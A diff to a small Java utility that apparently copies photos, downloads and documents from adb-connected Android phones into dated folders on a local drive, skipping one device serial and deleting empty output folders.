@@ -16,6 +16,8 @@ public class app {
   public static String pulff = tempdir + "pullf.bat";
   public static String savedrive = "E:";
   public static String storedir = savedrive + "/ge/garb/smalll5345/crawls/";
+  public static String[] phonedirs =
+      new String[] {"sdcard/DCIM/", "sdcard/Download/", "sdcard/Documents/"};
 
   public static void main(String[] args) throws Exception {
     fileutil.delete(temp);
@@ -27,6 +29,8 @@ public class app {
       if (t.contains("List"))
         continue;
       if (t.equals(""))
+        continue;
+      if (t.contains("R5CTB2C1LJA"))
         continue;
       if (t.contains("device"))
         devices.add(t.split("\t")[0]);
@@ -41,12 +45,11 @@ public class app {
     String device = s;
     String crawp = storedir + craw1 + "/";
     fileutil.makedir(crawp);
-    String direr = "sdcard/Documents/";
-    direr(craw1, crawp, direr, device);
-    direr = "sdcard/Downloads/";
-    direr(craw1, crawp, direr, device);
-    direr = "sdcard/DCIM/";
-    direr(craw1, crawp, direr, device);
+    String direr = "";
+    for (String ss : phonedirs) {
+      direr = ss;
+      direr(craw1, crawp, direr, device);
+    }
   }
 
   public static void direr(String craw1, String crawp, String direr, String device)
@@ -64,13 +67,27 @@ public class app {
     files = removelsof(files, r1);
     String savedir = storedir + direr + device + System.currentTimeMillis();
     fileutil.makedir(savedir);
+    String temp = savedir;
     for (String ss : files) {
       if (checkiflib(ss)) {
         dolib(ss, direr, tempdir, craw1, crawp, device, savedir);
       }
       dofile(direr, ss, crawp, craw1, device, savedir, savedrive);
     }
+    deleteempty(temp);
     fileutil.delete(temper);
+  }
+
+  public static void deleteempty(String savedir) throws Exception {
+    if (fileutil.isempty(savedir))
+      fileutil.delete(savedir);
+    String s = fileutil.removelastpath(savedir);
+    String[] dirs = fileutil.subdirs(s);
+    for (String ss : dirs) {
+      ss = s + ss;
+      if (fileutil.isempty(ss))
+        fileutil.delete(ss);
+    }
   }
 
   public static String[] removelsof(String[] files, String r1) {
@@ -85,8 +102,6 @@ public class app {
 
   public static void dofile(String direr, String ss, String crawp, String craw1, String device,
       String savedir, String savedrive) throws Exception {
-    if (direr.endsWith("/"))
-      return;
     String com = "start " + pulff + " " + device + " " + direr + " " + "foo" + " " + tempdir + " "
         + storedir + " " + savedrive + " " + savedir;
     SBmain.doer(com);
@@ -105,15 +120,6 @@ public class app {
   }
 
   public static boolean checkiflib(String ss) {
-    String temp = ss;
-    ss = ss.split(".")[0];
-    if (ss.length() != 0)
-      return false;
-    ss = temp;
-    if (ss.length() > 7)
-      return false;
-    if (ss.length() < 6)
-      return false;
     char[] ff = ss.toCharArray();
     for (int i = 0; i < ff.length; ++i) {
       char s = ff[i];
